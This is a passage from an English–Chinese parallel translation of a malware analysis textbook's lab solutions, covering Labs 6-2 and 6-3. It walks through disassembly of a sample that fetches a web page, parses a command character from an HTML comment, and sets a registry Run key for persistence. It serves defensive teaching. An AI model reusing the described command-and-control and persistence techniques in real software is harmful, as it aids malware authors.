  zh: 因为WinINet经常使用HTTP，我们在字符串中看到了一个URL。如果我们设置Netcat监听端口80并相应地重定向DNS，我们将看到对*www.practicalmalwareanalysis.com*的DNS查询，之后程序从URL请求网页，如列表6-3L所示。这告诉我们这个网页对恶意软件有某种重要性，但我们不知道具体是什么，直到我们分析汇编代码。
- en: C:\>nc -l -p 80
  id: totrans-1367
  prefs: []
  type: TYPE_NORMAL
  zh: C:\>nc -l -p 80
- en: GET /cc.htm HTTP/1.1
  id: totrans-1368
  prefs: []
  type: TYPE_NORMAL
  zh: GET /cc.htm HTTP/1.1
- en: 'User-Agent: Internet Explorer 7.5/pma'
  id: totrans-1369
  prefs: []
  type: TYPE_NORMAL
  zh: 'User-Agent: Internet Explorer 7.5/pma'
- en: 'Host: www.practicalmalwareanalysis.com'
  id: totrans-1370
  prefs: []
  type: TYPE_NORMAL
  zh: '主机: www.practicalmalwareanalysis.com'
- en: '*Listing 6-3L: Netcat output when listening on port 80*'
  id: totrans-1371
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表6-3L：监听端口80时的Netcat输出*'
- en: Finally, we load the executable into IDA Pro. We begin our analysis with the
    main method since much of the other code is generated by the compiler.
  id: totrans-1372
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们将可执行文件加载到IDA Pro中。我们以main方法开始分析，因为其他大部分代码是由编译器生成的。
- en: Looking at the disassembly for main, we notice that it calls the same method
    at 0x401000 that we saw in Lab 6-1\. However, two new calls (401040 and 40117F)
    in the main method were not in Lab 6-1\.
  id: totrans-1373
  prefs: []
  type: TYPE_NORMAL
  zh: 查看main的汇编代码，我们注意到它调用了我们在第6-1节中看到的0x401000的相同方法。然而，在main方法中的两个新调用（401040和40117F）在第6-1节中没有。
- en: '**504**'
  id: totrans-1374
  prefs: []
  type: TYPE_NORMAL
  zh: '**504**'
- en: Appendix C
  id: totrans-1375
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1376
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'In the new call to 0x40117F, we notice that two parameters are pushed on the
    stack before the call. One parameter is the format string Success: Parsed command
    is %c, and the other is the byte returned from the previous call at 0x401148\.
    Format characters such as %c and %d tell us that we’re looking at a format string.
    Therefore, we can deduce that printf is the subroutine located at 0x40117F, and
    we should rename it as such, so that it’s renamed everywhere it is referenced.
    The printf subroutine will print the string with the %c replaced by the other
    parameter pushed on the stack.'
  id: totrans-1377
  prefs: []
  type: TYPE_NORMAL
  zh: '在对0x40117F的新调用中，我们注意到在调用之前有两个参数被推入堆栈。一个参数是格式字符串Success: 解析的命令是%c，另一个是来自之前调用0x401148的返回字节。像%c和%d这样的格式字符告诉我们我们正在查看一个格式字符串。因此，我们可以推断printf是位于0x40117F的子程序，我们应该将其重命名为这样，以便在所有引用的地方都进行重命名。printf子程序将打印带有%c被推入堆栈的另一个参数替换的字符串。'
- en: Next, we examine the new call to 0x401040\. This function contains all of the
    WinINet API calls we discovered during the basic static analysis process. It first
    **6**
  id: totrans-1378
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们检查对0x401040的新调用。这个函数包含了我们在基本静态分析过程中发现的所有WinINet API调用。它首先**6**
- en: calls InternetOpen, which initializes the use of the WinINet library. Notice
    that Internet Explorer 7.5/pma is pushed on the stack, matching the User-Agent
    we noticed during dynamic analysis. The next call is to InternetOpenUrl, which
    opens the static web page pushed onto the stack as a parameter. This function
    caused the DNS request we saw during dynamic analysis.
  id: totrans-1379
  prefs: []
  type: TYPE_NORMAL
  zh: 调用InternetOpen，这初始化了WinINet库的使用。注意，在动态分析期间，我们注意到的User-Agent 7.5/pma被推入堆栈，与我们在动态分析期间注意到的User-Agent相匹配。下一个调用是InternetOpenUrl，它以参数形式打开推入堆栈的静态网页。这个函数导致了我们在动态分析期间看到的DNS请求。
- en: Listing 6-4L shows the InternetOpenUrlA and the InternetReadFile calls.
  id: totrans-1380
  prefs: []
  type: TYPE_NORMAL
  zh: 列表6-4L显示了InternetOpenUrlA和InternetReadFile调用。
- en: 00401070 call ds:**InternetOpenUrlA**
  id: totrans-1381
  prefs: []
  type: TYPE_NORMAL
  zh: 00401070 call ds:**InternetOpenUrlA**
- en: 00401076 mov [ebp+hFile], eax
  id: totrans-1382
  prefs: []
  type: TYPE_NORMAL
  zh: 00401076 mov [ebp+hFile], eax
- en: 00401079 cmp [ebp+hFile], 0 
  id: totrans-1383
  prefs: []
  type: TYPE_NORMAL
  zh: 00401079 cmp [ebp+hFile], 0 
- en: '...'
  id: totrans-1384
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040109D lea edx, [ebp+dwNumberOfBytesRead]
  id: totrans-1385
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109D lea edx, [ebp+dwNumberOfBytesRead]
- en: 004010A0 push edx ; lpdwNumberOfBytesRead
  id: totrans-1386
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A0 push edx ; lpdwNumberOfBytesRead
- en: 004010A1 push 200h ; dwNumberOfBytesToRead
  id: totrans-1387
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A1 push 200h ; dwNumberOfBytesToRead
- en: 004010A6 lea eax, [ebp+Buffer ]
  id: totrans-1388
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A6 lea eax, [ebp+Buffer ]
- en: 004010AC push eax ; lpBuffer
  id: totrans-1389
  prefs: []
  type: TYPE_NORMAL
  zh: 004010AC push eax ; lpBuffer
- en: 004010AD mov ecx, [ebp+hFile]
  id: totrans-1390
  prefs: []
  type: TYPE_NORMAL
  zh: 004010AD mov ecx, [ebp+hFile]
- en: 004010B0 push ecx ; hFile
  id: totrans-1391
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B0 push ecx ; hFile
- en: 004010B1 call ds:**InternetReadFile**
  id: totrans-1392
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B1 call ds:**InternetReadFile**
- en: 004010B7 mov [ebp+var_4], eax
  id: totrans-1393
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B7 mov [ebp+var_4], eax
- en: 004010BA cmp [ebp+var_4], 0 
  id: totrans-1394
  prefs: []
  type: TYPE_NORMAL
  zh: 004010BA cmp [ebp+var_4], 0 
- en: 004010BE jnz short loc_4010E5
  id: totrans-1395
  prefs: []
  type: TYPE_NORMAL
  zh: 004010BE jnz short loc_4010E5
- en: '*Listing 6-4L: InternetOpenUrlA and InternetReadFile calls* We can see that
    the return value from InternetOpenUrlA is moved into the local variable hFile
    and compared to 0 at . If it is 0, this function will be terminated; otherwise,
    the hFile variable will be passed to the next function, InternetReadFile. The
    hFile variable is a handle—a way to access something that has been opened. This
    handle is accessing a URL.'
  id: totrans-1396
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 6-4L：InternetOpenUrlA 和 InternetReadFile 调用* 我们可以看到 InternetOpenUrlA 的返回值被移动到局部变量
    hFile 中，并在  处与 0 进行比较。如果是 0，则此函数将被终止；否则，hFile 变量将被传递到下一个函数，即 InternetReadFile。hFile
    变量是一个句柄——一种访问已打开对象的方式。这个句柄正在访问一个 URL。'
- en: InternetReadFile is used to read the web page opened by InternetOpenUrlA.
  id: totrans-1397
  prefs: []
  type: TYPE_NORMAL
  zh: InternetReadFile 用于读取由 InternetOpenUrlA 打开的网页。
- en: If we read the MSDN page on this API function, we can learn about the other
    parameters. The most important of these parameters is the second one, which IDA
    Pro has labels Buffer, as shown at . Buffer is an array of data, and in this
    case, we will be reading up to 0x200 bytes worth of data, as shown by the NumberOfBytesToRead
    parameter at . Since we know that this function is reading an HTML web page,
    we can think of Buffer as an array of characters.
  id: totrans-1398
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们阅读关于此 API 函数的 MSDN 页面，我们可以了解其他参数。其中最重要的参数是第二个参数，IDA Pro 将其标记为 Buffer，如图
     所示。Buffer 是一个数据数组，在这种情况下，我们将读取多达 0x200 字节的数据，如图  中的 NumberOfBytesToRead 参数所示。由于我们知道此函数正在读取一个
    HTML 网页，我们可以将 Buffer 视为一个字符数组。
- en: Solutions to Labs
  id: totrans-1399
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**505**'
  id: totrans-1400
  prefs: []
  type: TYPE_NORMAL
  zh: '**505**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1401
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Following the call to InternetReadFile, code at  checks to see if the return
    value (EAX) is 0\. If it is 0, the function closes the handles and terminates;
    if not, the code immediately following this line compares Buffer one character
    at a time, as shown in Listing 6-5L. Notice that each time, the index into Buffer
    goes up by 1 before it is moved into a register, and then compared.
  id: totrans-1402
  prefs: []
  type: TYPE_NORMAL
  zh: 在调用 InternetReadFile 之后，代码在  处检查返回值（EAX）是否为 0。如果是 0，则函数关闭句柄并终止；如果不是，则此行之后的代码将逐个字符比较
    Buffer，如图 6-5L 所示。请注意，每次在将索引移动到寄存器并比较之前，Buffer 的索引都会增加 1。
- en: 004010E5 movsx ecx, byte ptr [ebp+Buffer]
  id: totrans-1403
  prefs: []
  type: TYPE_NORMAL
  zh: 004010E5 movsx ecx, byte ptr [ebp+Buffer]
- en: 004010EC cmp ecx, 3Ch 
  id: totrans-1404
  prefs: []
  type: TYPE_NORMAL
  zh: 004010EC cmp ecx, 3Ch 
- en: 004010EF jnz short loc_40111D
  id: totrans-1405
  prefs: []
  type: TYPE_NORMAL
  zh: 004010EF jnz short loc_40111D
- en: 004010F1 movsx edx, byte ptr [ebp+Buffer+1] 
  id: totrans-1406
  prefs: []
  type: TYPE_NORMAL
  zh: 004010F1 movsx edx, byte ptr [ebp+Buffer+1] 
- en: 004010F8 cmp edx, 21h
  id: totrans-1407
  prefs: []
  type: TYPE_NORMAL
  zh: 004010F8 cmp edx, 21h
- en: 004010FB jnz short loc_40111D
  id: totrans-1408
  prefs: []
  type: TYPE_NORMAL
  zh: 004010FB jnz short loc_40111D
- en: 004010FD movsx eax, byte ptr [ebp+Buffer+2]
  id: totrans-1409
  prefs: []
  type: TYPE_NORMAL
  zh: 004010FD movsx eax, byte ptr [ebp+Buffer+2]
- en: 00401104 cmp eax, 2Dh
  id: totrans-1410
  prefs: []
  type: TYPE_NORMAL
  zh: 00401104 cmp eax, 2Dh
- en: 00401107 jnz short loc_40111D
  id: totrans-1411
  prefs: []
  type: TYPE_NORMAL
  zh: 00401107 jnz short loc_40111D
- en: 00401109 movsx ecx, byte ptr [ebp+Buffer+3]
  id: totrans-1412
  prefs: []
  type: TYPE_NORMAL
  zh: 00401109 movsx ecx, byte ptr [ebp+Buffer+3]
- en: 00401110 cmp ecx, 2Dh
  id: totrans-1413
  prefs: []
  type: TYPE_NORMAL
  zh: 00401110 cmp ecx, 2Dh
- en: 00401113 jnz short loc_40111D
  id: totrans-1414
  prefs: []
  type: TYPE_NORMAL
  zh: 00401113 jnz short loc_40111D
- en: 00401115 mov al, [ebp+var_20C] 
  id: totrans-1415
  prefs: []
  type: TYPE_NORMAL
  zh: 00401115 mov al, [ebp+var_20C] 
- en: 0040111B jmp short loc_40112C
  id: totrans-1416
  prefs: []
  type: TYPE_NORMAL
  zh: 0040111B jmp short loc_40112C
- en: '*Listing 6-5L: Buffer handling*'
  id: totrans-1417
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 6-5L：缓冲区处理*'
- en: At , the cmp instruction checks to see if the first character is equal to 0x3C,
    which corresponds to the < symbol in ASCII. We can right-click on 3Ch, and IDA
    Pro will offer to change it to display <. In the same way, we can do this throughout
    the listing for 21h, 2Dh, and 2Dh. If we combine the characters, we will have
    the string <!--, which happens to be the start of a comment in HTML. (HTML comments
    are not displayed when viewing web pages in a browser, but you can see them by
    viewing the web page source.) Notice at  that Buffer+1 is moved into EDX before
    it is compared to 0x21 (! in ASCII). Therefore, we can assume that Buffer is an
    array of characters from the web page downloaded by InternetReadFile. Since Buffer
    points to the start of the web page, the four cmp instructions are used to check
    for an HTML comment immediately at the start of the web page. If all comparisons
    are successful, the web page starts with the embedded HTML comment, and the code
    at  is executed. (Unfortunately, IDA Pro fails to realize that the local variable
    Buffer is of size 512 and has displayed a local variable named var_20C instead.)
  id: totrans-1418
  prefs: []
  type: TYPE_NORMAL
  zh: 在  处，cmp 指令检查第一个字符是否等于 0x3C，这对应于 ASCII 中的 < 符号。我们可以在 3Ch 上右击，IDA Pro 将提供将其更改为显示
    < 的选项。同样，我们可以在列表中的 21h、2Dh 和 2Dh 处执行此操作。如果我们组合这些字符，我们将得到字符串 <!--，这恰好是 HTML 注释的开始。（在浏览器中查看网页时，HTML
    注释不会显示，但您可以通过查看网页源代码来查看它们。）注意在  处，Buffer+1 在与 0x21 (! 在 ASCII) 比较之前被移入 EDX。因此，我们可以假设
    Buffer 是从 InternetReadFile 下载的网页中的字符数组。由于 Buffer 指向网页的开始，四个 cmp 指令用于检查网页开始处的 HTML
    注释。如果所有比较都成功，则网页以嵌入的 HTML 注释开始，并执行  处的代码。（不幸的是，IDA Pro 没有意识到局部变量 Buffer 的大小为
    512，并显示了一个名为 var_20C 的局部变量。）
- en: We need to fix the stack of this function to display a 512-byte array in order
    for the Buffer array to be labeled properly throughout the function.
  id: totrans-1419
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要修复此函数的栈，以便在整个函数中正确地标记 Buffer 数组，以便显示一个 512 字节的数组。
- en: We can do this by pressing CTRL-K anywhere within the function. For example,
    the left side of Figure 6-2L shows the initial stack view. To fix the stack, we
    right-click on the first byte of Buffer and define an array 1 byte wide and 512
    bytes large. The right side of the figure shows what the corrected stack should
    look like.
  id: totrans-1420
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过在函数中的任何位置按 CTRL-K 来完成这个操作。例如，图 6-2L 的左侧显示了初始的栈视图。为了修复栈，我们右击 Buffer 的第一个字节，并定义一个宽度为
    1 字节、大小为 512 字节的数组。图例的右侧显示了修复后的栈应该看起来像什么。
- en: Manually adjusting the stack like this will cause the instruction numbered 
    in Listing 6-5L to be displayed as [ebp+Buffer+4]. Therefore, if the first four
    characters (Buffer[0]-Buffer[3]) match <!--, the fifth character will be moved
    into AL and returned from this function.
  id: totrans-1421
  prefs: []
  type: TYPE_NORMAL
  zh: 以这种方式手动调整栈会导致列表 6-5L 中编号为  的指令显示为 [ebp+Buffer+4]。因此，如果前四个字符（Buffer[0]-Buffer[3]）匹配
    <!--，第五个字符将被移入 AL，并从这个函数返回。
- en: '**506**'
  id: totrans-1422
  prefs: []
  type: TYPE_NORMAL
  zh: '**506**'
- en: Appendix C
  id: totrans-1423
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1424
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 110](index-540_1.png)'
  id: totrans-1425
  prefs: []
  type: TYPE_IMG
  zh: '![Image 110](index-540_1.png)'
- en: '![Image 111](index-540_2.png)'
  id: totrans-1426
  prefs: []
  type: TYPE_IMG
  zh: '![Image 111](index-540_2.png)'
- en: '*Figure 6-2L: Creating an array and fixing the stack*'
  id: totrans-1427
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 6-2L：创建数组并修复栈*'
- en: Returning to the main method, let’s analyze what happens after the 0x401040
    function returns. If this function returns a nonzero value, the **6**
  id: totrans-1428
  prefs: []
  type: TYPE_NORMAL
  zh: 返回到主方法，让我们分析 0x401040 函数返回后发生的事情。如果此函数返回非零值，则 **6**
- en: 'main method will print as “Success: Parsed command is *X*,” where *X* is the
    character parsed from the HTML comment, followed by a call to the Sleep function
    at 0x401173\. Using MSDN, we learn that the Sleep function takes a single parameter
    containing the number of milliseconds to sleep. It pushes 0xEA60 on the stack,
    which corresponds to sleeping for one minute (60,000'
  id: totrans-1429
  prefs: []
  type: TYPE_NORMAL
  zh: 主方法将打印为“成功：解析的命令是 *X*，”其中 *X* 是从 HTML 注释中解析出的字符，随后调用 Sleep 函数在 0x401173 处。使用
    MSDN，我们了解到 Sleep 函数接受一个包含要休眠的毫秒数的单个参数。它在栈上推送 0xEA60，这对应于休眠一分钟（60,000 毫秒）。
- en: milliseconds).
  id: totrans-1430
  prefs: []
  type: TYPE_NORMAL
  zh: 毫秒）。
- en: To summarize, this program checks for an active Internet connection, and then
    downloads a web page containing the string <!--, the start of a comment in HTML.
    An HTML comment will not be displayed in a web browser, but you can view it by
    looking at the HTML page source. This technique of hiding commands in HTML comments
    is used frequently by attackers to send commands to malware while having the malware
    appear as if it were going to a normal web page.
  id: totrans-1431
  prefs: []
  type: TYPE_NORMAL
  zh: 总结来说，该程序检查是否存在活跃的互联网连接，然后下载包含字符串 <!-- 的网页，这是 HTML 注释的开始。HTML 注释在网页浏览器中不会显示，但您可以通过查看
    HTML 页面源代码来查看它。这种在 HTML 注释中隐藏命令的技术经常被攻击者用来在恶意软件看起来像是要访问正常网页的同时发送命令给恶意软件。
- en: '**Lab 6-3 Solutions**'
  id: totrans-1432
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 6-3 解答**'
- en: '***Short Answers***'
  id: totrans-1433
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答***'
- en: 1\.
  id: totrans-1434
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The functions at 0x401000 and 0x401040 are the same as those in Lab 6-2\.
  id: totrans-1435
  prefs: []
  type: TYPE_NORMAL
  zh: 0x401000 和 0x401040 地址处的函数与 Lab 6-2 中的函数相同。
- en: At 0x401271 is printf. The 0x401130 function is new to this lab.
  id: totrans-1436
  prefs: []
  type: TYPE_NORMAL
  zh: 在 0x401271 处是 printf。0x401130 函数是本实验中新的。
- en: 2\.
  id: totrans-1437
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The new function takes two parameters. The first is the command character parsed
    from the HTML comment, and the second is the program name argv[0], the standard
    main parameter.
  id: totrans-1438
  prefs: []
  type: TYPE_NORMAL
  zh: 新函数接受两个参数。第一个是从 HTML 注释中解析出的命令字符，第二个是程序名称 argv[0]，这是标准的主参数。
- en: 3\.
  id: totrans-1439
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The new function contains a switch statement with a jump table.
  id: totrans-1440
  prefs: []
  type: TYPE_NORMAL
  zh: 新函数包含一个 switch 语句和跳转表。
- en: 4\.
  id: totrans-1441
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The new function can print error messages, delete a file, create a directory,
    set a registry value, copy a file, or sleep for 100 seconds.
  id: totrans-1442
  prefs: []
  type: TYPE_NORMAL
  zh: 新函数可以打印错误消息、删除文件、创建目录、设置注册表值、复制文件或休眠 100 秒。
- en: 5\.
  id: totrans-1443
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: The registry key Software\Microsoft\Windows\CurrentVersion\Run\Malware and the
    file location *C:\Temp\cc.exe* can both be host-based indicators.
  id: totrans-1444
  prefs: []
  type: TYPE_NORMAL
  zh: 注册表键 Software\Microsoft\Windows\CurrentVersion\Run\Malware 和文件位置 *C:\Temp\cc.exe*
    都可以作为基于主机的指示器。
- en: 6\.
  id: totrans-1445
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: The program first checks for an active Internet connection. If no Internet connection
    is found, the program terminates. Otherwise, the program will attempt to download
    a web page containing an embedded HTML comment beginning with <!--. The first
    character of the comment is parsed and used in a switch statement to determine
    which action to take on the local system, including whether to delete a file,
    create a directory, set a registry run key, copy a file, or sleep for 100 seconds.
  id: totrans-1446
  prefs: []
  type: TYPE_NORMAL
  zh: 程序首先检查是否存在活跃的互联网连接。如果没有找到互联网连接，程序将终止。否则，程序将尝试下载包含嵌入 HTML 注释的网页，该注释以 <!-- 开始。注释的第一个字符将被解析并用于
    switch 语句，以确定在本地系统上采取哪些操作，包括是否删除文件、创建目录、设置注册表运行键、复制文件或休眠 100 秒。
- en: Solutions to Labs
  id: totrans-1447
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解答
- en: '**507**'
  id: totrans-1448
  prefs: []
  type: TYPE_NORMAL
  zh: '**507**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1449
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Detailed Analysis***'
  id: totrans-1450
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We begin by performing basic static analysis on the binary and find several
    new strings of interest, as shown in Listing 6-6L.
  id: totrans-1451
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先对二进制文件进行基本的静态分析，并发现了一些新的有趣字符串，如列表 6-6L 所示。
- en: 'Error 3.2: Not a valid command provided'
  id: totrans-1452
  prefs: []
  type: TYPE_NORMAL
  zh: 错误 3.2：未提供有效命令
- en: 'Error 3.1: Could not set Registry value'
  id: totrans-1453
  prefs: []
  type: TYPE_NORMAL
  zh: 错误 3.1：无法设置注册表值
- en: Malware
  id: totrans-1454
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件
- en: Software\Microsoft\Windows\CurrentVersion\Run
  id: totrans-1455
  prefs: []
  type: TYPE_NORMAL
  zh: Software\Microsoft\Windows\CurrentVersion\Run
- en: C:\Temp\cc.exe
  id: totrans-1456
  prefs: []
  type: TYPE_NORMAL
  zh: C:\Temp\cc.exe
- en: C:\Temp
  id: totrans-1457
  prefs: []
  type: TYPE_NORMAL
  zh: C:\Temp
- en: '*Listing 6-6L: Interesting new strings contained in Lab 6-3*'
  id: totrans-1458
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 6-6L：Lab 6-3 中包含的有趣新字符串*'
- en: These error messages suggest that the program may be able to modify the registry.
    Software\Microsoft\Windows\CurrentVersion\Run is a common autorun location in
    the registry. *C:\Temp\cc.exe* is a directory and filename that may be useful
    as a host-based indicator.
  id: totrans-1459
  prefs: []
  type: TYPE_NORMAL
  zh: 这些错误消息表明程序可能能够修改注册表。Software\Microsoft\Windows\CurrentVersion\Run 是注册表中的常见自动运行位置。*C:\Temp\cc.exe*
    是一个可能作为基于主机的指示器有用的目录和文件名。
- en: Looking at the imports, we see several new Windows API functions not found in
    Lab 6-2, as shown in Listing 6-7L.
  id: totrans-1460
  prefs: []
  type: TYPE_NORMAL
  zh: 通过查看导入项，我们看到一些新的 Windows API 函数，这些函数在 Lab 6-2 中没有找到，如列表 6-7L 所示。
- en: DeleteFileA
  id: totrans-1461
  prefs: []
  type: TYPE_NORMAL
  zh: DeleteFileA
- en: CopyFileA
  id: totrans-1462
  prefs: []
  type: TYPE_NORMAL
  zh: CopyFileA
- en: CreateDirectoryA
  id: totrans-1463
  prefs: []
  type: TYPE_NORMAL
  zh: CreateDirectoryA
- en: RegOpenKeyExA
  id: totrans-1464
  prefs: []
  type: TYPE_NORMAL
  zh: RegOpenKeyExA
- en: RegSetValueExA
  id: totrans-1465
  prefs: []
  type: TYPE_NORMAL
  zh: RegSetValueExA
- en: '*Listing 6-7L: Interesting new import functions contained in Lab 6-3*'
  id: totrans-1466
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 6-7L：Lab 6-3 中包含的有趣新导入函数*'
- en: The first three imports are self-explanatory. The RegOpenKeyExA function is
    typically used with RegSetValueExA to insert information into the registry, usually
    when the malware sets itself or another program to start on system boot for the
    sake of persistence. (We discuss the Windows registry in depth in Chapter 7.)
  id: totrans-1467
  prefs: []
  type: TYPE_NORMAL
  zh: 前三个导入项是显而易见的。RegOpenKeyExA 函数通常与 RegSetValueExA 一起使用，用于将信息插入注册表，通常在恶意软件将自己或另一个程序设置为系统启动时使用，以实现持久性。（我们在第
    7 章中深入讨论 Windows 注册表。）
- en: Next, we perform dynamic analysis, but find that it isn’t very fruitful (not
    surprising based on what we discovered in Lab 6-2). We could connect the malware
    directly to the Internet or use INetSim to serve web pages to the malware, but
    we wouldn’t know what to put in the HTML comment. Therefore, we need to perform
    more in-depth analysis by looking at the disassembly.
  id: totrans-1468
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们执行动态分析，但发现它并不很有成效（基于我们在Lab 6-2中发现的内容，这并不令人惊讶）。我们可以直接将恶意软件连接到互联网或使用INetSim为恶意软件提供网页，但我们不知道在HTML注释中应该放什么。因此，我们需要通过查看反汇编代码进行更深入的分析。
- en: Finally, we load the executable into IDA Pro. The main method looks nearly identical
    to the one from Lab 6-2, except there is an extra call to 0x401130\. The calls
    to 0x401000 (check Internet connection) and 0x401040
  id: totrans-1469
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们将可执行文件加载到IDA Pro中。主方法看起来几乎与Lab 6-2中的相同，除了有一个额外的调用到0x401130。对0x401000（检查网络连接）和0x401040
- en: (download web page and parse HTML comment) are identical to those in Lab 6-2\.
  id: totrans-1470
  prefs: []
  type: TYPE_NORMAL
  zh: (下载网页并解析HTML注释)与Lab 6-2中的相同。
- en: Next, we examine the parameters passed to 0x401130\. It looks like argv and
    var_8 are pushed onto the stack before the call. In this case, argv is Argv[0],
    a reference to a string containing the current program’s name, *Lab06-03.exe*.
  id: totrans-1471
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们检查传递给0x401130的参数。看起来在调用之前，argv和var_8被压入堆栈。在这种情况下，argv是Argv[0]，它指向一个包含当前程序名称的字符串，*Lab06-03.exe*。
- en: Examining the disassembly, we see that var_8 is set to AL at 0x40122D.
  id: totrans-1472
  prefs: []
  type: TYPE_NORMAL
  zh: 检查反汇编代码，我们看到var_8在0x40122D被设置为AL。
- en: Remember that EAX is the return value from the previous function call, and that
    AL is contained within EAX. In this case, the previous function call **508**
  id: totrans-1473
  prefs: []
  type: TYPE_NORMAL
  zh: 记住EAX是从上一个函数调用返回的值，并且AL包含在EAX中。在这种情况下，上一个函数调用**508**
- en: Appendix C
  id: totrans-1474
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1475
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: is 0x401040 (download web page and parse HTML comment). Therefore, var_8 is
    passed to 0x401130 containing the command character parsed from the HTML comment.
  id: totrans-1476
  prefs: []
  type: TYPE_NORMAL
  zh: 是0x401040（下载网页并解析HTML注释）。因此，var_8包含从HTML注释中解析出的命令字符，传递给0x401130。
- en: Now that we know what is passed to the function at 0x401130, we can analyze
    it. Listing 6-8L is from the start of the function.
  id: totrans-1477
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道了传递给0x401130函数的内容，我们可以分析它。列表6-8L是从函数开始的部分。
- en: 00401136 movsx eax, [ebp+arg_0]
  id: totrans-1478
  prefs: []
  type: TYPE_NORMAL
  zh: 00401136 movsx eax, [ebp+arg_0]
- en: 0040113A mov [ebp+var_8], eax
  id: totrans-1479
  prefs: []
  type: TYPE_NORMAL
  zh: 0040113A mov [ebp+var_8], eax
- en: 0040113D mov ecx, [ebp+var_8] 
  id: totrans-1480
  prefs: []
  type: TYPE_NORMAL
  zh: 0040113D mov ecx, [ebp+var_8] 
- en: 00401140 sub ecx, 61h
  id: totrans-1481
  prefs: []
  type: TYPE_NORMAL
  zh: 00401140 sub ecx, 61h
- en: '**6**'
  id: totrans-1482
  prefs: []
  type: TYPE_NORMAL
  zh: '**6**'
- en: 00401143 mov [ebp+var_8], ecx
  id: totrans-1483
  prefs: []
  type: TYPE_NORMAL
  zh: 00401143 mov [ebp+var_8], ecx
- en: 00401146 cmp [ebp+var_8], 4 
  id: totrans-1484
  prefs: []
  type: TYPE_NORMAL
  zh: 00401146 cmp [ebp+var_8], 4 
- en: 0040114A ja loc_4011E1
  id: totrans-1485
  prefs: []
  type: TYPE_NORMAL
  zh: 0040114A ja loc_4011E1
- en: 00401150 mov edx, [ebp+var_8]
  id: totrans-1486
  prefs: []
  type: TYPE_NORMAL
  zh: 00401150 mov edx, [ebp+var_8]
- en: 00401153 jmp ds:off_4011F2[edx*4] 
  id: totrans-1487
  prefs: []
  type: TYPE_NORMAL
  zh: 00401153 jmp ds:off_4011F2[edx*4] 
- en: '...'
  id: totrans-1488
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 004011F2 off_4011F2 dd offset loc_40115A 
  id: totrans-1489
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F2 off_4011F2 dd 偏移 loc_40115A 
- en: 004011F6 dd offset loc_40116C
  id: totrans-1490
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F6 dd offset loc_40116C
- en: 004011FA dd offset loc_40117F
  id: totrans-1491
  prefs: []
  type: TYPE_NORMAL
  zh: 004011FA dd offset loc_40117F
- en: 004011FE dd offset loc_40118C
  id: totrans-1492
  prefs: []
  type: TYPE_NORMAL
  zh: 004011FE dd offset loc_40118C
- en: 00401202 dd offset loc_4011D4
  id: totrans-1493
  prefs: []
  type: TYPE_NORMAL
  zh: 00401202 dd offset loc_4011D4
- en: '*Listing 6-8L: Analyzing the function at 0x401130*'
  id: totrans-1494
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表6-8L：分析0x401130处的函数*'
- en: arg_0 is an automatic label from IDA Pro that lists the last parameter pushed
    before the call; therefore, arg_0 is the parsed command character retrieved from
    the Internet. The parsed command character is moved into var_8 and eventually
    loaded into ECX at . The next instruction subtracts 0x61 (the letter *a* in ASCII)
    from ECX. Therefore, once this instruction executes, ECX will equal 0 when arg_0
    is equal to *a*.
  id: totrans-1495
  prefs: []
  type: TYPE_NORMAL
